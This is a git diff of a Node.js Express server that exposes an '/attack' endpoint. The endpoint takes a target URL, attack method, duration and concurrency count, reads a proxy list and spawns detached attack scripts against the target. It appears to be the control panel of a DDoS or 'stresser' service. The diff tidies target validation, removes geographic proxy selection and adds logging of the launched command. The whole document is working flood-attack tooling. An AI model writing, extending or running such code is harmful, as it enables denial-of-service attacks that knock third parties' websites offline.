@@ -28,9 +28,20 @@ const methodMap = {
 };
 
 app.get('/attack', async (req, res) => {
-  let { target, time, method, geo, concurrents } = req.query;
+  let { target, time, method, concurrents } = req.query;
 
   if (!method) return res.status(400).json({ error: 'Method is required.' });
+  if (!target) return res.status(400).json({ error: 'Target is required.' });
+
+  if (!target.startsWith('http://') && !target.startsWith('https://')) {
+    target = 'https://' + target;
+  }
+
+  try {
+    new URL(target);
+  } catch (e) {
+    return res.status(400).json({ error: 'Invalid URL format.' });
+  }
 
   const methodKey = String(method).toUpperCase();
 
@@ -38,18 +49,7 @@ app.get('/attack', async (req, res) => {
     return res.status(400).json({ error: `Method ${method} is invalid.` });
   }
 
-  if (!target) {
-    return res.status(400).json({ error: 'Target is required. Use ?target=https://example.com' });
-  }
-
-  if (!/^https?:\/\//i.test(target)) {
-    return res.status(400).json({ error: 'Target must start with http:// or https://' });
-  }
-
-  const validGeo = ['ALL', 'ID', 'US'];
-  const geoUpper = geo ? geo.toUpperCase() : 'ALL';
-  const proxyFile = validGeo.includes(geoUpper) ? `${geoUpper.toLowerCase()}.txt` : 'valid_http.txt';
-
+  const proxyFile = 'valid_http.txt';
   const concurrentsNum = Math.max(1, parseInt(concurrents || '1', 10) || 1);
   const totalAttackTime = Math.max(1, parseInt(time || '10', 10) || 10);
 
@@ -66,9 +66,12 @@ app.get('/attack', async (req, res) => {
   });
 
   try {
+    console.log(`\n[#] RUNNING METHOD: ${methodKey}`);
+    console.log(`[#] COMMAND: ${executor} ${script} ${finalArgs.join(' ')}`);
+
     const proc = spawn(executor, [script, ...finalArgs], {
       cwd: '/root/y',
-      stdio: 'ignore',
+      stdio: 'inherit',
       detached: true
     });
 
@@ -80,15 +83,14 @@ app.get('/attack', async (req, res) => {
       method: methodKey,
       time: totalAttackTime,
       concurrents: concurrentsNum,
-      geo: geoUpper,
       proxyFile: proxyFile,
       pid: proc.pid
     });
 
-    console.log(`[-] Attack: ${target} | Method: ${methodKey} | Time: ${totalAttackTime}s | Conc: ${concurrentsNum} | Geo: ${geoUpper} | Proxy: ${proxyFile} | PID: ${proc.pid}`);
+    console.log(`[-] SUCCESS: ${target} | PID: ${proc.pid}\n`);
 
   } catch (error) {
-    console.error(`[-] Start error: ${error.message}`);
+    console.error(`[-] ERROR: ${error.message}`);
     res.status(500).json({ error: 'Failed to start', details: error.message });
   }
 });
